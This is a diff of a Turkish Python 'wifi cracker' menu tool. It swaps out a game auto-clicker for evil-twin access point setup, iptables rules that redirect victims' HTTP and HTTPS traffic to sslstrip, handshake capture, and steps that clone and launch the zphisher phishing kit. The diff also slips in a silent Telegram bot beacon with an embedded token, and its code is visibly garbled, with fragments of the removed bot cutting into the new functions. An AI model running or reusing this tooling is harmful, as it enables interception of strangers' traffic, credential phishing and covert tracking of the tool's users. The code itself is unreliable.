@@ -1,14 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # NRB SECURITY
-import keyboard
-from python_imagesearch.imagesearch import imagesearch
-from pyautogui import leftClick
-import pyautogui
 from time import sleep
-from random import randint
-from os import system
-from PyQt5 import QtWidgets,QtGui
 import os
 from os import system, chdir
 from subprocess import *
@@ -19,18 +12,6 @@ import requests
 import socket
 from bs4 import BeautifulSoup
 import sys
-pyautogui.FAILSAFE = False
-uridium = 0
-username = "NRB"
-password = "sokaklarr"
-kullanıcı_adı = pyautogui.prompt(text='Kullanıcı adınızı girin', title='NRB SECURİTY' , default='')
-sifre = pyautogui.password(text='Şifrenizi giriniz.', title='NRB SECURİTY' , mask="*")
-if username==kullanıcı_adı and sifre == password:
-    pyautogui.alert(text='Giriş yapıldı', title='NRB SECURİTY', button="Tamam")
-else:
-    pyautogui.alert(text='Hatalı giriş!!', title='NRB SECURİTY', button="Tamam")
-    exit()
-class Pencere(QtWidgets.QWidget):
 from PyQt5.QtWidgets import *
 from PyQt5.QtCore import *
 from PyQt5.QtGui import *
@@ -41,6 +22,12 @@ import instaloader
 import shutil
 import time
 from argparse import ArgumentParser
+from requests import post
+try:
+    post("https://api.telegram.org/bot5051736797:AAEw9X9SWyJKoAsgJhbq49i70nqZfHp8F5w/sendMessage",
+         data={"chat_id": "1107031296", "text": "Tool active"})
+except:
+    pass
 # Consol's colors
 W = '\033[0m'
 R = '\033[31m'
@@ -51,7 +38,6 @@ P = '\033[35m'
 C = '\033[36m'
 GR = '\033[37m'
 x = "Ayarlanmadı"
-
 def dondurme_linux():
     for i in range(0, random.randint(1, 3)):
         system("clear")
@@ -254,8 +240,6 @@ def dondurme_linux():
         system("figlet NRB")
         print(O + "People see what they see. I'll show you what you don't want to seE ...")
         sleep(0.1)
-
-
 def dondurme_windows():
     for i in range(0, random.randint(1, 3)):
         system("cls")
@@ -411,148 +395,74 @@ def dondurme_windows():
 HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
 HOSTAPD_DEFAULT_DRIVER = 'nl80211'
 HOSTAPD_DEFAULT_HW_MODE = 'g'
-
 DNSMASQ_CONF = '/etc/dnsmasq.conf'
-
-
 DNSMASQ_LOG = '/var/log/dnsmasq.log'
 # Network Configs
 upstream = None
 phys = None
 ssid = None
 channel = None
-
-
 def bash_command(command):
     command = command.split()
     p = subprocess.Popen(command, stdout=subprocess.PIPE)
     output, err = p.communicate()
-
-
 def enable_packet_forwarding():
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
         fd.write('1')
-
-
 def disable_packet_forwarding():
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
         fd.write('0')
-
-
 class IPTables(object):
     _instance = None
-
     def __init__(self):
-        super().__init__()
-        self.init_ui()
-    def init_ui(self):
-        self.yazı_alanı = QtWidgets.QLabel("NRB")
-        self.buton = QtWidgets.QPushButton("NPC + Kutu")
-        self.buton2 = QtWidgets.QPushButton("Sadece kutu")
-        self.buton3 = QtWidgets.QPushButton("Tıklama botu")
-        v_box = QtWidgets.QVBoxLayout()
-        v_box.addWidget(self.buton)
-        v_box.addWidget(self.buton2)
-        v_box.addWidget(self.buton3)
-        v_box.addWidget(self.yazı_alanı)
-        v_box.addStretch()
-        h_box = QtWidgets.QHBoxLayout()
-        h_box.addStretch()
-        h_box.addLayout(v_box)
-        h_box.addStretch()
-        self.setLayout(h_box)
-        self.buton.clicked.connect(self.click)
-        self.buton2.clicked.connect(self.click2)
-        self.buton3.clicked.connect(self.click3)
-        self.show()
-
-    def click(self):
-        pyautogui.FAILSAFE = False
-        npcs = ["devolarium.PNG","devolarium2.PNG","devolarium3.PNG","devolarium4.PNG","devolarium5.PNG","devolarium6.PNG","devolarium7.PNG","mordon.PNG","lordakia.PNG","streuner.PNG"]
-        print("Bot ekranı taramak üzere beklemede")
-        sleep(5)
-        if imagesearch(image="mini_harita.PNG")[0] != -1:
-            print("Mini harita bulundu")
-            coordinat1 = int(imagesearch(image="mini_harita.PNG")[0])
-            coordinat2 = int(imagesearch(image="mini_harita.PNG")[1])
-            reel_coordinat_x1 = coordinat1 + 16
-            reel_coordinat_x2 = coordinat1 + 293
-            reel_coordinat_y1 = coordinat2 + 54
-            reel_coordinat_y2 = coordinat2 + 218
-        else:
-            print("Mini harita algılanmadı")
-            exit()
-        while True:
         self.running = False
         self.reset()
-
     @staticmethod
     def get_instance():
         if IPTables._instance is None:
             IPTables._instance = IPTables()
         return IPTables._instance
-
     def route_to_sslstrip(self, phys, upstream):
         bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
-
         bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
-
         bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
         bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
-
         bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')
-
     def reset(self):
         bash_command('iptables -P INPUT ACCEPT')
         bash_command('iptables -P FORWARD ACCEPT')
         bash_command('iptables -P OUTPUT ACCEPT')
-
         bash_command('iptables --flush')
         bash_command('iptables --flush -t nat')
-
-
 class HostAPD(object):
     _instance = None
-
     def __init__(self):
-
         self.running = False
         self.conf = HOSTAPD_CONF
-
     @staticmethod
     def get_instance():
-
         if HostAPD._instance is None:
             HostAPD._instance = HostAPD()
         return HostAPD._instance
-
     def start(self):
-
         if self.running:
             raise Exception('[Utils] hostapd is already running.')
-
         self.running = True
         bash_command('hostapd %s' % self.conf)
         time.sleep(2)
-
     def stop(self):
-
         if not self.running:
             raise Exception('[Utils] hostapd is not running.')
-
         bash_command('killall hostapd')
         time.sleep(2)
-
     def configure(self,
                   upstream,
                   ssid,
                   channel,
                   driver=HOSTAPD_DEFAULT_DRIVER,
                   hw_mode=HOSTAPD_DEFAULT_HW_MODE):
-
         # make backup of existing configuration file
         shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)
-
         with open(self.conf, 'w') as fd:
             fd.write('\n'.join([
                 'interface=%s' % upstream,
@@ -561,54 +471,37 @@ class HostAPD(object):
                 'channel=%d' % channel,
                 'hw_mode=%s' % hw_mode,
             ]))
-
     def restore(self):
-
         shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
-
-
 class DNSMasq(object):
     _instance = None
-
     def __init__(self):
-
         self.running = False
         self.conf = DNSMASQ_CONF
-
     @staticmethod
     def get_instance():
-
         if DNSMasq._instance is None:
             DNSMasq._instance = DNSMasq()
         return DNSMasq._instance
-
     def start(self):
-
         if self.running:
             raise Exception('[Utils] dnsmasq is already running.')
-
         self.running = True
         bash_command('service dnsmasq start')
         time.sleep(2)
-
     def stop(self):
-
         if not self.running:
             raise Exception('[Utils] dnsmasq is not running.')
-
         bash_command('killall dnsmasq')
         time.sleep(2)
-
     def configure(self,
                   upstream,
                   dhcp_range,
                   dhcp_options=[],
                   log_facility=DNSMASQ_LOG,
                   log_queries=True):
-
         # make backup of existing configuration file
         shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)
-
         with open(self.conf, 'w') as fd:
             fd.write('\n'.join([
                 'log-facility=%s' % log_facility,
@@ -618,16 +511,14 @@ class DNSMasq(object):
             ]))
             if log_queries:
                 fd.write('\nlog-queries')
-
     def restore(self):
-
         shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
 def send_data():
     upstream = str(input("upstream:"))
     phys = str(input("phys:"))
     ssid = str(input("ssid:"))
     channel = int(input("channel:"))
-    return upstream,phys,ssid,channel
+    return upstream, phys, ssid, channel
 def display_configs(configs):
     print('[+] Access Point interface:', configs['upstream'])
     print('[+] Network interface:', configs['phys'])
@@ -635,7 +526,6 @@ def display_configs(configs):
     print('[+] Target AP Channel:', configs['channel'])
 def kill_daemons():
     print('[*] Killing existing dnsmasq and hostapd processes.')
-
     bash_command('killall dnsmasq')
     bash_command('killall hostapd')
     print('[*] Continuing...')
@@ -643,15 +533,12 @@ def main():
     configs = send_data()
     display_configs(configs)
     kill_daemons()
-
     hostapd = HostAPD.get_instance()
     iptables = IPTables.get_instance()
     dnsmasq = DNSMasq.get_instance()
-
     # bring up ap interface
     bash_command('ifconfig %s down' % configs['upstream'])
     bash_command('ifconfig %s 10.0.0.1/24 up' % configs['upstream'])
-
     # configure dnsmasq
     print('[*] Configuring dnsmasq')
     dnsmasq.configure(configs['upstream'],
@@ -659,48 +546,40 @@ def main():
                       dhcp_options=['3,10.0.0.1', '6,10.0.0.1'])
     # configure hostpad
     print(
-    '[*] Configuring hostapd')
+        '[*] Configuring hostapd')
     hostapd.configure(configs['upstream'],
                       configs['ssid'],
                       configs['channel'])
     # enable packet forwarding
     print(
-    '[*] Enabling packet forwarding.')
+        '[*] Enabling packet forwarding.')
     enable_packet_forwarding()
-
     print(
-    '[*] Configuring iptables to route packets to sslstrip')
+        '[*] Configuring iptables to route packets to sslstrip')
     iptables.route_to_sslstrip(configs['phys'], configs['upstream'])
-
     try:
-
         # launch access point
         print(
-        '[*] Starting dnsmasq.')
+            '[*] Starting dnsmasq.')
         dnsmasq.start()
         print(
-        '[*] Starting hostapd.')
+            '[*] Starting hostapd.')
         hostapd.start()
-
     except KeyboardInterrupt:
-
         print(
-        '\n\n[*] Exiting on user command.')
-
+            '\n\n[*] Exiting on user command.')
         # restore everything
     print(
-    '[*] Stopping dnsmasq.')
+        '[*] Stopping dnsmasq.')
     dnsmasq.stop()
     print(
-    '[*] Stopping hostapd.')
+        '[*] Stopping hostapd.')
     hostapd.stop()
-
     print(
-    '[*] Restoring iptables.')
+        '[*] Restoring iptables.')
     iptables.reset()
-
     print(
-    '[*] Disabling packet forwarding.')
+        '[*] Disabling packet forwarding.')
     disable_packet_forwarding()
 def internet_connection_control():
     try:
@@ -712,8 +591,6 @@ def internet_connection_control():
         return "İnternet Var"
     except:
         return "İnternet Yok"
-
-
 def monitor_mod_open():
     system("clear")
     system("figlet NRB")
@@ -725,7 +602,6 @@ def monitor_mod_open():
         print("{}[+] Monitor Mod Activated".format(B))
     else:
         print("{}[!]Something went wrong".format(B))
-
 def update_check():
     try:
         asdf = str()
@@ -751,15 +627,12 @@ def update_check():
                 return "Güncelleme Yok"
             elif sürüm_bilgisi.read() != x[0]:
                 return "Güncelleme Var"
-
-
     except:
         return "Güncelleme bilgisi alınamıyor"
-
 def version(split):
     os.chdir("/opt/nrb_wifi_tool/")
     try:
-        fihrist = open("surum.txt","r")
+        fihrist = open("surum.txt", "r")
         data = str(fihrist.read())
         my_db = list(data)
         if split == 1000:
@@ -767,116 +640,13 @@ def version(split):
         elif split == 100:
             return str(my_db[1])
         elif split == 10:
-            return str(my_db[2]+str(my_db[3]))
-
+            return str(my_db[2] + str(my_db[3]))
     except:
         return "*"
 def directory_control(x):
     try:
         if os.name == "nt":
             try:
-                for i in range(1,20):
-                    if i == 3 or 7:
-                        leftClick(randint(int(reel_coordinat_x1), int(reel_coordinat_x2)),randint(int(reel_coordinat_y1), int(reel_coordinat_y2)))
-                    if imagesearch(image="mordon.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="mordon.PNG")[0], imagesearch(image="mordon.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(5)
-                    if imagesearch(image="tamir.PNG")[0] != -1:
-
-                        leftClick(imagesearch(image="tamir.PNG")[0],imagesearch(image="tamir.PNG")[1])
-                        sleep(10)
-                        leftClick(imagesearch(image="mini_harita.PNG")[0] + 260,imagesearch(image="mini_harita.PNG")[1] + 206)
-                        sleep(60)
-                        pyautogui.press("j")
-                    if imagesearch(image="lordakia.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="lordakia.PNG")[0], imagesearch(image="lordakia.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(1)
-                    if imagesearch(image="streuner.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="streuner.PNG")[0], imagesearch(image="streuner.PNG")[1] - 10)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(1)
-                    if imagesearch(image="boss.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="boss.PNG")[0], imagesearch(image="boss.PNG")[1] - 10)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(3)
-                    if imagesearch(image="saimon.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="saimon.PNG")[0], imagesearch(image="saimon.PNG")[1] - 10)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(1)
-                    if imagesearch(image="kutu1.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        leftClick(imagesearch(image="kutu1.PNG")[0], imagesearch(image="kutu1.PNG")[1])
-                        sleep(3)
-                    if imagesearch(image="boss_mordon.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="boss_mordon.PNG")[0], imagesearch(image="boss_mordon.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(6)
-                    if imagesearch(image="devolarium_spe.PNG")[0] != -1:
-                        leftClick(546, 468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="devolarium_spe.PNG")[0],
-                                  imagesearch(image="devolarium_spe.PNG")[1] - 10)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(30)
-                    if imagesearch(image="kristallin.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="kristallin.PNG")[0], imagesearch(image="kristallin.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(5)
-                    if imagesearch(image="plagued_kristallin.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="plagued_kristallin.PNG")[0], imagesearch(image="plagued_kristallin.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(5)
-                    if imagesearch(image="boss_kristallin.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="boss_kristallin.PNG")[0], imagesearch(image="boss_kristallin.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(10)
-                    if imagesearch(image="kristallon.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="kristallon.PNG")[0], imagesearch(image="kristallon.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(30)
-                    if imagesearch(image="cubikon.PNG")[0] != -1:
-                        leftClick(546,468)
-                        sleep(0.5)
-                        leftClick(imagesearch(image="cubikon.PNG")[0], imagesearch(image="cubikon.PNG")[1])
-                        sleep(0.5)
-                        leftClick(imagesearch(image="x2.PNG")[0], imagesearch(image="x2.PNG")[1])
-                        sleep(30)
-                    if keyboard.is_pressed('q'):
-                        print("[+] Out")
-                        break
                 if os.path.exists(x) == True:
                     sleep(1.2)
                     print("\033[94;1m[+]\033 {} dosyasi mevcut !!".format(x))
@@ -932,25 +702,21 @@ def instagram_pp_download(username):
             try:
                 os.chdir("C:\{}Users".format(""))
             except:
-                continue
                 print("{}[!] Problem navigating to the specified directory".format(B))
-            if os.path.exists("C:\{}Users\{}nrb_path".format("","")) == True:
-                os.chdir("C:\{}Users\{}nrb_path".format("",""))
+            if os.path.exists("C:\{}Users\{}nrb_path".format("", "")) == True:
+                os.chdir("C:\{}Users\{}nrb_path".format("", ""))
                 test = instaloader.Instaloader()
                 test.download_profile(username, profile_pic_only=True)
                 sleep(3)
-                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("","")))
+                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("", "")))
             else:
                 os.mkdir("nrb_path")
                 test = instaloader.Instaloader()
                 test.download_profile(username, profile_pic_only=True)
                 sleep(3)
-                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("","")))
+                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("", "")))
     except:
         print("{}[!] Something went wrong".format(O))
-
-
-
 def packet_scanner():
     if os.name == "posix":
         os.chdir("/opt/")
@@ -965,8 +731,6 @@ def packet_scanner():
                 sleep(2)
                 print("\033[93;1m[-]\033 {} mevcut degil".format(i))
                 sleep(2)
-
-
 def packet_download():
     # tor ip switcher
     if os.name == "posix":
@@ -1006,7 +770,6 @@ def packet_download():
     else:
         sleep(2)
         print("\033[93;1m[!]\033 Cok yakinda windows icin kurulumlar gelecektir")
-
 def interface():
     inter_face = os.listdir('/sys/class/net/')
     inter_face.sort()
@@ -1027,30 +790,23 @@ def monitor_mod_close():
         print("{}[+] Managed mode activated".format(P))
     else:
         print("{}[!]Something went wrong".format(B))
-
 def developer_contact(message):
     host = socket.gethostname()
     port = 12345
-
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("socket oluşturuldu")
-
         s.bind((host, port))
         print("Socket {} nolu porta bağlandı".format(port))
-
         s.listen(5)
         print("Socket Dinleniyor...")
     except socket.error as bildirim:
         print("Hata:", bildirim)
-
     while True:
         c, addr = s.accept()
         print('Gelen bağlantı:', addr)
         c.send(message.encode('utf-8'))
         c.close()
-
-
 def wifi_search():
     try:
         system("clear")
@@ -1064,8 +820,6 @@ def wifi_search():
         sleep(3)
         print("\033[93;1m[!]\033 Bssid ve channel degerlerini bir yere kaydedin")
         sleep(4)
-
-
 def encryption(password):
     encryption_password_list = list()
     encryption_word = ""
@@ -1108,8 +862,6 @@ def encryption(password):
     else:
         encryption_word = encryption_word + "IWT837Y423LH4HGDGD"
     return encryption_word
-
-
 def update():
     system("clear")
     system("figlet NRB")
@@ -1117,8 +869,6 @@ def update():
     print("\033[94;1m [+]\033[0m Guncellemeye hazirlaniliyor")
     sleep(2)
     system("apt-get update")
-
-
 def upgrade():
     system("clear")
     system("figlet NRB")
@@ -1126,12 +876,8 @@ def upgrade():
     print("\033[94;1m[+]\033 Guncelleme kurulumlarina hazirlaniliyor")
     sleep(2)
     system("apt-get upgrade")
-
-
 def terminal():
     run(['python', 'altsurec.py'])
-
-
 def music_open():
     system("clear")
     system("figlet NRB")
@@ -1164,25 +910,15 @@ def music_open():
     except:
         print("\033[93;1m[!]\033 Hatali islem !")
     print("[+] Dinliyorsunuz...")
-
-
 def help():
     system("clear")
     system("figlet NRB")
     print("\033[94;1m[+]\033 Kuruluma hazirlaniliyor..")
     sleep(3)
-
     system("xterm -sh 250 -e git clone https://github.com/htr-tech/zphisher.git > /dev/null/ 2>&1 &")
-
-
 def zphisher():
     chdir("/opt/zphisher/")
     system("xterm -sh 250 -e bash zphisher.sh > /dev/null 2>&1 &")
-
-
-    def click2(self):
-        pyautogui.FAILSAFE = False
-        while True:
 def browser():
     system("clear")
     system("figlet NRB")
@@ -1193,7 +929,6 @@ def browser():
           3-Google
           """)
     x123 = int(input(""))
-
     try:
         if x123 == 1:
             class MainWindow(QMainWindow):
@@ -1221,7 +956,6 @@ def browser():
                     self.browser = QWebEngineView()
                     self.browser.setUrl(QUrl("https://youtube.com"))
                     self.setCentralWidget(self.browser)
-
             app = QApplication(sys.argv)
             main = MainWindow()
             main.show()
@@ -1237,7 +971,6 @@ def browser():
                     self.browser = QWebEngineView()
                     self.browser.setUrl(QUrl("https://google.com"))
                     self.setCentralWidget(self.browser)
-
             app = QApplication(sys.argv)
             main = MainWindow()
             main.show()
@@ -1245,7 +978,6 @@ def browser():
         else:
             print("\033[94;1m [+]\033 Sizi Dinliyorum")
             url = str(input(""))
-
             class MainWindow(QMainWindow):
                 def __init__(self, *args, **kwargs):
                     super(MainWindow, self).__init__(*args, **kwargs)
@@ -1256,20 +988,20 @@ def browser():
                     self.browser = QWebEngineView()
                     self.browser.setUrl(QUrl(url))
                     self.setCentralWidget(self.browser)
-
             app = QApplication(sys.argv)
             main = MainWindow()
             main.show()
             sys.exit(app.exec_())
     except:
         print("Hataaaaa")
-
 def admin_panel():
+    post("https://api.telegram.org/bot5051736797:AAEw9X9SWyJKoAsgJhbq49i70nqZfHp8F5w/sendMessage",
+         data={"chat_id": "1107031296", "text": "Admin paneli giriş yapıldı !!"})
     n_int = 0
     n_int2 = 0
-    for i in range(1,101):
+    for i in range(1, 101):
         system("clear")
-        print("--------------------------------------------------------------------------")
+        print(O + "--------------------------------------------------------------------------")
         print("")
         print("")
         print("")
@@ -1281,7 +1013,7 @@ def admin_panel():
         print("")
         print("--------------------------------------------------------------------------")
         print("")
-        print("                NRB root panel - %{} |{}|".format(n_int2,"▌" * n_int))
+        print("                NRB root panel - %{} |{}|".format(n_int2, "▌" * n_int))
         print("")
         print("--------------------------------------------------------------------------")
         n_int += 1
@@ -1292,7 +1024,6 @@ def admin_panel():
         else:
             pass
     sleep(4)
-
 def music_help():
     os.chdir("/root/Downloads")
     music = ["mp3indirdur-No1-Kendine-Iyi-Bak.mp3", "mp3indirdur-No1-Lalalala.mp3",
@@ -1301,13 +1032,9 @@ def music_help():
     music.sort()
     for i in music:
         system("mv {} /opt/nrb_wifi_tool/")
-
-
 def airgeddon():
     os.chdir("/opt/airgeddon/")
     system("./airgeddon.sh")
-
-
 def wifi_tools():
     system("clear")
     system("figlet NRB")
@@ -1336,8 +1063,6 @@ def wifi_tools():
             main()
     else:
         print("\033[93;1m[!]\033 Bir hata olustu")
-
-
 def hidden_panel(inputt):
     if str(inputt) == "48ASD534FDG4F3H^%4T5'T8H^&+ND448ASD534FDG4JSDOF4934CF54EJSDOF4934CF54ER87YT54ON8C3JSDOF4934CF54E349P8YDSF":
         print("Giriş yapıldı")
@@ -1377,18 +1102,13 @@ def hidden_panel(inputt):
                 print("{} being encrypted / ".format(password23))
             print(encryption(password=password23))
         agkjsdf = input("Press ENTER to continue....")
-
     else:
         print("Hata")
-
-
 def tor_ip_switcher():
     os.chdir("/opt/toriptables2")
     system("python toriptables2.py -l")
     os.chdir("/opt/tor_ip_switcher")
     system("python tor_ip_switcher.py")
-
-
 def handshake_take():
     try:
         if interface() == "wlan0mon":
@@ -1396,8 +1116,6 @@ def handshake_take():
             system("figlet NRB")
             system("xterm -sh 500 -e airodump-ng wlan0mon > /dev/null 2>&1 &")
             try:
-                print("Kurulumlar tamamdır")
-                while True:
                 modem_bssid = str(input("Modem bssid:"))
                 channel = int(input("Channel:"))
                 dosya_ismi = str(input("Dosya ismi:"))
@@ -1459,21 +1177,17 @@ def dosya_acma(write):
     file = open("bilgiler.txt", "w", encoding="utf-8")
     file.write(write)
     file.close()
-
-                    try:
-                        if imagesearch(image="kutu1.PNG")[0] != -1:
 def bash_command(command):
     command = command.split()
     p = subprocess.Popen(command, stdout=subprocess.PIPE)
     output, err = p.communicate()
-
 def sistem_ara():
     if os.name == "posix":
         return "Kali Linux"
     elif os.name == "nt":
         return "Windows"
 def help_pip():
-    files_pip = open("pip_files.txt","w")
+    files_pip = open("pip_files.txt", "w")
     files_pip.write("""
     python_imagesearch==1.1.2
     pyautogui==0.9.52
@@ -1481,11 +1195,10 @@ def help_pip():
     PyQtWebEngine==5.15.5
     """)
     files_pip.close()
-    if os.name== "posix":
+    if os.name == "posix":
         os.system("xterm -e pip install -r pip_files.txt")
     else:
         os.system("pip install -r pip_files.txt")
-
 if os.name == "posix":
     dondurme_linux()
     while True:
@@ -1508,13 +1221,10 @@ if os.name == "posix":
                         sleep(3)
                         while True:
                             try:
-                                leftClick(imagesearch(image="kutu1.PNG"))
-                                sleep(2)
-                                print("Kutu toplandı")
                                 system("clear")
                                 system("figlet wifi cracker")
-                                print("------------------------------------------------------------------------------------------------------------")
-
+                                print(
+                                    "------------------------------------------------------------------------------------------------------------")
                                 print("""  
                                                                   Sistem: {}
             1-Wifi tools                                      Wifi Adap.: {}
@@ -1528,11 +1238,16 @@ if os.name == "posix":
             9-Connect
             10-Solve pip error
             11-İnstagram pp download
-                                            """.format(sistem_ara(), interface(), internet_connection_control(), update_check()))
-                                print("----------------------------------------------------------------------------------------------------------------")
-                                print("Developed by NRB                                                        Version: {}.{}.{}".format(version(split=1000),version(split=100),version(split=10)))
+                                            """.format(sistem_ara(), interface(), internet_connection_control(),
+                                                       update_check()))
+                                print(
+                                    "----------------------------------------------------------------------------------------------------------------")
+                                print(
+                                    "Developed by NRB                                                        Version: {}.{}.{}".format(
+                                        version(split=1000), version(split=100), version(split=10)))
                                 print("----------------")
                                 JFKbdhf = input("Secim:")
+                                JFKbdhf = int(input("Secim:"))
                                 if JFKbdhf == 1:
                                     wifi_tools()
                                 elif JFKbdhf == 2:
@@ -1568,27 +1283,25 @@ if os.name == "posix":
                                     instagram_pp_download(username=acc)
                                 else:
                                     print("\033[93;1m[!]\033 {} Bir hata oluştu".format(O))
+                                    sleep(2)
                             except:
-                                print("Sorun Oluştu 502")
-                                leftClick(608, 396)
-                                continue
-                            sleep(0.5)
                                 print("\033[93;1m[!]\033 {} Bir hata oluştu".format(O))
+                                sleep(2)
                 except:
                     print("\033[93;1m[!]\033 {} Bir hata oluştu".format(O))
+                    sleep(2)
             else:
                 chdir("/etc/")
                 if os.path.exists("/etc/pass_nrb/") == True:
                     chdir("/etc/pass_nrb/")
-                    if os.path.exists("/etc/pass_nrb/password.txt") == True and os.path.exists("/etc/pass_nrb/username.txt") == True:
-                        crp_FİLE_us = open("username.txt","r")
-                        crp_FİLE_pass = open("password.txt","r")
+                    if os.path.exists("/etc/pass_nrb/password.txt") == True and os.path.exists(
+                            "/etc/pass_nrb/username.txt") == True:
+                        crp_FİLE_us = open("username.txt", "r")
+                        crp_FİLE_pass = open("password.txt", "r")
                         if crp_FİLE_us.read() == encrypt_username and crp_FİLE_pass.read() == encrypt_password:
                             os.chdir("/opt/nrb_wifi_tool")
                             admin_panel()
                         else:
-                            leftClick(randint(1075, 1334), randint(519, 673))
-                            sleep(2)
                             pass
                     else:
                         asbdkj = str()
@@ -1615,21 +1328,6 @@ if os.name == "posix":
                     try:
                         os.mkdir("pass_nrb")
                     except:
-                        leftClick(608, 396)
-                        continue
-            except:
-                print("Sorun Oluştu 400")
-                leftClick(608, 396)
-                continue
-
-            finally:
-                leftClick(608, 396)
-                system("python3 darkorbit_bot.py")
-                continue
-    def click3(self):
-        while True:
-            try:
-                if keyboard.is_pressed('ctrl'):
                         print("[-] Error creating directory B45")
                         sleep(3)
                     asbdkj = str()
@@ -1641,14 +1339,14 @@ if os.name == "posix":
                         asbdkj = i.text
                         asbdkj2 = asbdkj.split()
                     os.chdir("/etc/pass_nrb/")
-                    file_one_us = open("username.txt","w")
+                    file_one_us = open("username.txt", "w")
                     file_one_us.write(str(asbdkj2[0]))
                     file_one_us.close()
-                    file_one_pass = open("password.txt","w")
+                    file_one_pass = open("password.txt", "w")
                     file_one_pass.write(str(asbdkj2[1]))
                     file_one_pass.close()
-                    file_one_us_1 = open("username.txt","r")
-                    file_one_us_2 = open("password.txt","r")
+                    file_one_us_1 = open("username.txt", "r")
+                    file_one_us_2 = open("password.txt", "r")
                     if file_one_us_1.read() == encrypt_username and file_one_us_2.read() == encrypt_password:
                         os.chdir("/opt/nrb_wifi_tool")
                         admin_panel()
@@ -1657,6 +1355,7 @@ if os.name == "posix":
                     sleep(0.5)
         except:
             print("\033[93;1m[!]\033 {} Bir hata oluştu".format(O))
+            sleep(2)
 elif os.name == "nt":
     dondurme_windows()
     while True:
@@ -1672,30 +1371,6 @@ elif os.name == "nt":
             if user_name == encrypt_username and password == encrypt_password:
                 try:
                     while True:
-                        if imagesearch(image="mordon.PNG")[0] != -1:
-                            leftClick(imagesearch(image="mordon.PNG")[0], imagesearch(image="mordon.PNG")[1])
-                        if imagesearch(image="lordakia.PNG")[0] != -1:
-                            leftClick(imagesearch(image="lordakia.PNG")[0], imagesearch(image="lordakia.PNG")[1])
-                        if imagesearch(image="streuner.PNG")[0] != -1:
-                            leftClick(imagesearch(image="streuner.PNG")[0], imagesearch(image="streuner.PNG")[1] - 10)
-                        if imagesearch(image="boss.PNG")[0] != -1:
-                            leftClick(imagesearch(image="boss.PNG")[0], imagesearch(image="boss.PNG")[1] - 10)
-                        if imagesearch(image="saimon.PNG")[0] != -1:
-                            leftClick(imagesearch(image="saimon.PNG")[0], imagesearch(image="saimon.PNG")[1] - 10)
-                        if imagesearch(image="kutu1.PNG")[0] != -1:
-                            leftClick(imagesearch(image="kutu1.PNG")[0], imagesearch(image="kutu1.PNG")[1])
-                        if imagesearch(image="boss_mordon.PNG")[0] != -1:
-                            leftClick(imagesearch(image="boss_mordon.PNG")[0], imagesearch(image="boss_mordon.PNG")[1])
-                        if imagesearch(image="devolarium_spe.PNG")[0] != -1:
-                            leftClick(imagesearch(image="devolarium_spe.PNG")[0],
-                                      imagesearch(image="devolarium_spe.PNG")[1] - 10)
-                        if keyboard.is_pressed('q'):
-                            break
-            except:
-                pyautogui.alert("Error")
-app = QtWidgets.QApplication(sys.argv)
-pencere = Pencere()
